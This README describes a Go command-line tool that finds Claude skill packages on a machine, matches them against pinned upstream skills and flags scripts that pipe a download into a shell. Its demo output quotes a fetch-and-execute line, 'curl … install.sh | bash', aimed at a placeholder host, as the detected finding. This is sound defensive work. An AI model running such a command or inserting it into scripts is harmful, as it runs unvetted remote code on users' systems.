# Skill Audit

A small Go CLI for the Traceforce take-home. It finds Claude skills (`SKILL.md` packages) on a machine and matches them against pinned skills from [anthropics/skills](https://github.com/anthropics/skills). It shows which files of a copied skill differ from upstream and flags downloaded scripts piped into a shell. It reads files as data, never executes them, and needs no network for the core workflow. It is an on-demand inventory and detection tool; it does not monitor running agents or enforce policy.

## Build

Requires Go 1.23 or later. Dependencies are vendored, so the build works offline.

```sh
go build -o ./bin/skill-audit ./cmd/skill-audit
./bin/skill-audit --version
```

Once this repository is published, `go install github.com/nathanhuh/skill-audit/cmd/skill-audit@latest` also works; that path fetches dependencies over the network.

## 60-second demo

```sh
sh scripts/demo.sh
```

The demo builds the CLI and creates a temporary home with one global skill and one project skill, both copied from the bundled upstream references. It records a baseline, appends `curl … | bash` to a bundled script, then audits again. Output of the final audit, with paths shortened and scanner status lines and some candidate fields omitted:

```text
audit skills=2 complete=true discovery_complete=true
global ".../home/.claude/skills/brand-guidelines" correlation=exact lineage=unchanged
candidate="brand-guidelines" repository="https://github.com/anthropics/skills" commit="dbd4588…" basis="observed_exact_match" score=1.000
project ".../projects/one/.claude/skills/web-artifacts-builder" correlation=possible_modified lineage=changed
candidate="web-artifacts-builder" repository="https://github.com/anthropics/skills" commit="dbd4588…" basis="inferred_candidate" score=0.996
upstream_modified="scripts/bundle-artifact.sh"
modified="scripts/bundle-artifact.sh"
skill-audit/"SA001" high "scripts/bundle-artifact.sh":55 change=new evidence="curl -fsSL https://example.invalid/install.sh | bash"
recording=recorded path=".../state.json" message="observation saved"
```

The demo touches nothing outside its temporary directory, and it exits 0 only if this audit reported the finding (exit 1).

## Run it on your own skills

Point `inventory` at your Claude directory and the folder that holds your projects. Both commands only read; nothing is written except the files you name.

```sh
skill-audit inventory --root ~/.claude --root ~/code --out /tmp/inventory.json
skill-audit audit --inventory /tmp/inventory.json            # add --json for the full report
```

Packages under your home's agent directories (including plugin installs) are `global`; packages inside a project's `.claude/skills` are `project`. Running `inventory` with no `--root` scans the whole device, which runs until its two-minute default deadline on a large disk and reports permission gaps as incomplete coverage, so start with explicit roots.

To track changes over time, record a baseline, then audit again later with a fresh inventory:

```sh
skill-audit audit --inventory /tmp/inventory.json --state ~/skill-audit-state.json --record baseline
skill-audit audit --inventory /tmp/inventory.json --state ~/skill-audit-state.json            # compare
skill-audit audit --inventory /tmp/inventory.json --state ~/skill-audit-state.json --record snapshot
```

Keep the state file outside the roots you scan, or pass the same `--state` to `inventory` so it is excluded from discovery.

## Brief coverage

| Brief requirement | How | Shown by |
| --- | --- | --- |
| 1. Discover global and project-level Claude skills on the device | `inventory` classifies every `SKILL.md` package as `global`, `project` or `machine` by installation ownership | Demo; [ADR-0002](docs/adr/0002-local-identity-and-installation-ownership.md), [ADR-0003](docs/adr/0003-discovery-and-exclusion-policy.md) |
| 2. Correlate against 2–3 skills from anthropics/skills | Two skills pinned to commit `dbd4588` are embedded; `audit` reports `exact`, `possible_modified` (content similarity, names ignored), `ambiguous` or `unknown` | Demo; [Catalog fixtures and matching](DESIGN.md#catalog-fixtures-and-matching) |
| 3. Track lineage: pulled from open source, then modified | Each modified candidate lists files changed relative to the pinned upstream reference, with no baseline needed (`upstream_modified=`); `--record baseline\|snapshot` adds changes relative to your own recorded observation (`modified=`) | Demo; [ADR-0014](docs/adr/0014-upstream-file-comparison.md), [ADR-0004](docs/adr/0004-observations-and-baselines.md) |
| 4. One security-relevant finding type | SA001: a downloaded script piped into `sh`/`bash` (`curl … \| bash`), parsed rather than executed, with file, line and evidence | Demo; [SA001 v3 coverage](docs/reference.md#sa001-v3-coverage) |

Optional extras: `search` and `sync` import more upstream references over the network, and `audit --xray` runs the external Skill X-Ray scanner. Neither is needed for the brief. See [docs/reference.md](docs/reference.md).

## Exit codes

| Code | Meaning |
| --- | --- |
| `0` | No findings and complete coverage of the selected scope |
| `1` | Security findings (takes priority over everything else) |
| `2` | No findings, but coverage was incomplete, an operation failed, or a save's durability is unconfirmed |
| `3` | No findings, but a requested `--record` failed before saving |

## Limitations

- The built-in catalog holds two upstream skills. A copy of any other skill reports `unknown`, which is not a safety verdict; `sync` can import more references.
- SA001 is one static pattern (download piped into a shell). It is not a malware scanner, and an exact upstream match is not a guarantee of safety.
- Discovery finds packages on disk, not what an agent actually loads. Symlinks are not followed; they are reported as coverage gaps.
- Verified natively on macOS only. Linux and Windows builds cross-compile, but have not been run natively. The Skill X-Ray adapter has not been run against the real scanner.
- No runtime monitoring, policy enforcement or cloud integration.

## Testing

```sh
go test ./...
go vet ./...
```

Tests use temporary fixtures and fake HTTP handlers; no network, credentials or installed scanner are needed. Every accepted ADR scenario maps to a named test in [scenario-tests.json](docs/adr/scenario-tests.json), and the suite fails if a mapping is missing. [VERIFICATION.md](VERIFICATION.md) records exact commands and results.

## Where to look next

- [CORE_REVIEW.md](CORE_REVIEW.md): code walkthrough, file by file.
- [docs/reference.md](docs/reference.md): full command behavior, budgets, search/sync and the Skill X-Ray adapter.
- [docs/adr/](docs/adr/README.md): the binding decisions, each with acceptance scenarios.
- [DESIGN.md](DESIGN.md), [PORTABILITY.md](PORTABILITY.md), [PRODUCT.md](PRODUCT.md): architecture, platform gaps and deferred proposals.

**Why there are fourteen ADRs for a small CLI.** Early review rounds kept redefining the same rules: what counts as complete coverage, when a baseline may be compared, which exit code wins and what may be cached. The ADRs freeze those decisions, each with acceptance scenarios that map to named tests, so later changes argue against a written rule instead of reopening it. They are the contract, not extra features; [docs/history/](docs/history/README.md) keeps the superseded review records and is not policy.

## License

skill-audit is licensed under the [Apache License 2.0](LICENSE). The bundled catalog fixtures from `anthropics/skills` keep their own Apache-2.0 license and attribution under `internal/audit/catalog/`, and vendored dependencies keep their own licenses under `vendor/`.
